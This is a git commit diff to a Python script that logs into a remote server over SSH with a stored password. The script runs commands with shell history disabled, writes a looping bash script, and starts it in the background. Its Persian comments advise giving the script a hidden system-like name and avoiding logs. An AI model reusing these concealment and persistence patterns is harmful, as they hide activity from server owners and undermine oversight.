6aeebda1de4267280af57c78b41d79edf7d0b9a6
wamir823 <wamir823@gmail.com>
2025-10-05 13:27:33 +0330

    Update main.py

--- main.py
+++ main.py
@@ -11,13 +11,13 @@ if text =="off":
     conn = Connection(host=serverip[0], user=serverip[1], connect_kwargs={"password": serverip[2]})
     conn.run(f'HISTFILE=/dev/null /bin/mkdir -p www', hide=True, warn=True, timeout=5)
     conn.run(f'HISTFILE=/dev/null /bin/chmod +x www/*', hide=True, warn=True, timeout=5)
-    conn.run(f'HISTFILE=/dev/null /bin/echo """#!/bin/bash
+    conn.run(f'''HISTFILE=/dev/null /bin/echo """#!/bin/bash
 # ذخیره با نامی مثل: .bash_system
 while true; do
     # کار اصلی شما
     sleep 30
     # لاگ نکنید یا به /dev/null بریزید
-done""" > www/a', hide=True, warn=True, timeout=5)
+done""" > www/a''', hide=True, warn=True, timeout=5)
     conn.run(f'HISTFILE=/dev/null /bin/cd www', hide=True, warn=True, timeout=5)
     try:
       conn.run(f'HISTFILE=/dev/null /bin/bash a &', hide=True, warn=True, timeout=5)
